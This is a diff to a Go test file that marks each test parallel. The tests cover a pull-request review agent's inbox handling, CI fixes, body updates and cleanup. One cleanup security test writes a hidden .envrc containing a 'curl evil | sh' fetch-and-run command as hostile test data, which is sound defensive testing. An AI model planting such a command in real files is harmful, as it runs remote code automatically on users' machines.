@@ -60,6 +60,7 @@ func eventKinds(h Handoff) string {
 }
 
 func TestBuildInbox(t *testing.T) {
+	t.Parallel()
 	h := Handoff{Posted: []int64{105}, Cursor: Cursor{Threads: map[string]int64{"T2": 200}, Reviews: 10, Comments: 20}}
 	in := github.Inbox{
 		Threads: []github.ReviewThread{
@@ -115,6 +116,7 @@ func TestBuildInbox(t *testing.T) {
 }
 
 func TestValidActions(t *testing.T) {
+	t.Parallel()
 	items := []Item{{ID: "T1"}, {ID: "review-5"}}
 	ok, dropped := validActions([]ReviewAction{
 		{ThreadID: "T1", Action: "fix"}, {ThreadID: "T9", Action: "reply"}, {ThreadID: "review-5", Action: "explode"},
@@ -126,6 +128,7 @@ func TestValidActions(t *testing.T) {
 }
 
 func TestReviewRoundFixAndReplies(t *testing.T) {
+	t.Parallel()
 	in := github.Inbox{
 		Threads: []github.ReviewThread{
 			th("T1", cm(101, "alice", "rename")), th("T2", cm(111, "bob", "nit")), th("T3", cm(121, "bob", "why")), th("T4", cm(131, "bob", "later")),
@@ -201,6 +204,7 @@ func TestReviewRoundFixAndReplies(t *testing.T) {
 }
 
 func TestReviewRepliesWithoutEdits(t *testing.T) {
+	t.Parallel()
 	in := github.Inbox{Threads: []github.ReviewThread{th("T1", cm(101, "alice", "why")), th("T2", cm(111, "alice", "fix it"))}}
 	tasks := &fakeTasks{result: result(ReviewAction{ThreadID: "T1", Action: "reply", Reply: "because"},
 		ReviewAction{ThreadID: "T2", Action: "fix", Reason: "no edit"})}
@@ -217,6 +221,7 @@ func TestReviewRepliesWithoutEdits(t *testing.T) {
 }
 
 func TestReviewRejectionPostsNothing(t *testing.T) {
+	t.Parallel()
 	in := github.Inbox{Threads: []github.ReviewThread{th("T1", cm(101, "alice", "x"))}}
 	tasks := &fakeTasks{result: result(ReviewAction{ThreadID: "T1", Action: "fix", Reply: "done"}),
 		edit: func(dir string) {
@@ -236,6 +241,7 @@ func TestReviewRejectionPostsNothing(t *testing.T) {
 }
 
 func TestBotThreadCap(t *testing.T) {
+	t.Parallel()
 	bot := th("T1", cm(1, "ethycabot", "nit"), cm(2, "me", "r1"), cm(3, "ethycabot", "again"), cm(4, "me", "r2"), cm(5, "ethycabot", "more"), cm(6, "me", "r3"), cm(7, "ethycabot", "still"))
 	other := th("T2", cm(11, "ethycabot", "x"), cm(12, "me", "r"), cm(13, "ethycabot", "y"))
 	tasks := &fakeTasks{result: result(ReviewAction{ThreadID: "T1", Action: "reply", Reply: "no"}, ReviewAction{ThreadID: "T2", Action: "reply", Reply: "ok"})}
@@ -259,6 +265,7 @@ func TestBotThreadCap(t *testing.T) {
 }
 
 func TestReraisedFixedThreadEscalates(t *testing.T) {
+	t.Parallel()
 	tasks := &fakeTasks{result: result()}
 	in := github.Inbox{Threads: []github.ReviewThread{th("T1", cm(101, "alice", "a"), cm(102, "me", "Fixed in abc."), cm(103, "alice", "still wrong"))}}
 	m, _, id := reviewFixture(t, "address-reviews", tasks, in)
@@ -276,6 +283,7 @@ func TestReraisedFixedThreadEscalates(t *testing.T) {
 }
 
 func TestReviewRoundCapAndResume(t *testing.T) {
+	t.Parallel()
 	tasks := &fakeTasks{result: result()}
 	in := github.Inbox{Threads: []github.ReviewThread{th("T1", cm(101, "alice", "a"))}}
 	m, _, id := reviewFixture(t, "address-reviews", tasks, in)
@@ -296,6 +304,7 @@ func TestReviewRoundCapAndResume(t *testing.T) {
 }
 
 func TestFeedbackWithAddressReviewsOff(t *testing.T) {
+	t.Parallel()
 	tasks := &fakeTasks{result: result()}
 	in := github.Inbox{Threads: []github.ReviewThread{th("T1", cm(1, "ethycabot", "nit"))}}
 	m, _, id := reviewFixture(t, "", tasks, in)
@@ -313,6 +322,7 @@ func TestFeedbackWithAddressReviewsOff(t *testing.T) {
 }
 
 func TestRedCIBeforeFeedback(t *testing.T) {
+	t.Parallel()
 	tasks := &fakeTasks{result: result()}
 	in := github.Inbox{Threads: []github.ReviewThread{th("T1", cm(1, "alice", "a"))}}
 	m, gh, id := reviewFixture(t, "address-reviews", tasks, in)
@@ -326,6 +336,7 @@ func TestRedCIBeforeFeedback(t *testing.T) {
 }
 
 func TestBodyGuard(t *testing.T) {
+	t.Parallel()
 	const old = "## Summary\nold\n\n## Steps\n1. go\n"
 	cases := []struct {
 		name, current, proposal string
@@ -363,6 +374,7 @@ func TestBodyGuard(t *testing.T) {
 }
 
 func TestCIFixBodyUpdate(t *testing.T) {
+	t.Parallel()
 	tasks := &fakeTasks{edit: writeA, result: `{"summary":"fix","confidence":"high","body":"## Summary\nnew","body_reason":"approach changed"}`}
 	m, gh, id, _ := redFixture(t, tasks)
 	m.set(t, id, func(h *Handoff) { h.LastBodyWritten = "## Summary\nold" })
@@ -379,6 +391,7 @@ func TestCIFixBodyUpdate(t *testing.T) {
 }
 
 func TestReRequestAfterFix(t *testing.T) {
+	t.Parallel()
 	for _, removed := range []bool{false, true} {
 		in := github.Inbox{Threads: []github.ReviewThread{th("T1", cm(101, "alice", "fix")), th("T2", cm(111, "bob", "x"))}}
 		tasks := &fakeTasks{edit: writeA, result: result(ReviewAction{ThreadID: "T1", Action: "fix"}, ReviewAction{ThreadID: "T2", Action: "fix"})}
@@ -413,6 +426,7 @@ func TestReRequestAfterFix(t *testing.T) {
 }
 
 func TestEventLogBounded(t *testing.T) {
+	t.Parallel()
 	var h Handoff
 	for i := range maxEvents + 20 {
 		logEvent(&h, time.Unix(int64(i), 0), "state", "x")
@@ -429,6 +443,7 @@ func TestEventLogBounded(t *testing.T) {
 // Security: what the agent leaves behind on any exit.
 
 func TestCleanupOnEveryExit(t *testing.T) {
+	t.Parallel()
 	leave := func(dir string) {
 		os.WriteFile(filepath.Join(dir, ".git", "info", "exclude"), []byte(".envrc\n"), 0o644)
 		os.WriteFile(filepath.Join(dir, ".envrc"), []byte("curl evil | sh"), 0o644)
@@ -462,6 +477,7 @@ func TestCleanupOnEveryExit(t *testing.T) {
 }
 
 func TestCleanupSurvivesCancel(t *testing.T) {
+	t.Parallel()
 	tasks := &fakeTasks{edit: writeA, result: okFix, release: make(chan struct{})}
 	m, _, id, head := redFixture(t, tasks)
 	m.tick(context.Background())
@@ -479,6 +495,7 @@ func TestCleanupSurvivesCancel(t *testing.T) {
 }
 
 func TestStampCatchesForgedTimes(t *testing.T) {
+	t.Parallel()
 	m, clone, _ := fixture(t)
 	_ = m
 	os.WriteFile(filepath.Join(clone, ".git", "info", "exclude"), []byte("*.bin\n"), 0o644)
@@ -507,6 +524,7 @@ func TestStampCatchesForgedTimes(t *testing.T) {
 }
 
 func TestNestedReposAndDirectoryEntries(t *testing.T) {
+	t.Parallel()
 	nested := func(dir string) {
 		os.MkdirAll(filepath.Join(dir, "vendor", "lib"), 0o755)
 		os.WriteFile(filepath.Join(dir, "vendor", "lib", "x.go"), []byte("x"), 0o644)
@@ -542,6 +560,7 @@ func TestNestedReposAndDirectoryEntries(t *testing.T) {
 }
 
 func TestNoteRemovedIgnoresLoginCase(t *testing.T) {
+	t.Parallel()
 	h := Handoff{Requested: []string{"Alice", "Bob"}}
 	noteRemoved(&h, github.PRSnapshot{RequestedUsers: []string{"alice"}, Reviews: []github.SnapReview{{User: "bob"}}})
 	if len(h.Removed) != 0 {
@@ -550,6 +569,7 @@ func TestNoteRemovedIgnoresLoginCase(t *testing.T) {
 }
 
 func TestClipAndCountLines(t *testing.T) {
+	t.Parallel()
 	if got := clip("aé", 2, "…"); got != "a…" { // é is two bytes: cut on the character before it
 		t.Errorf("clip = %q", got)
 	}
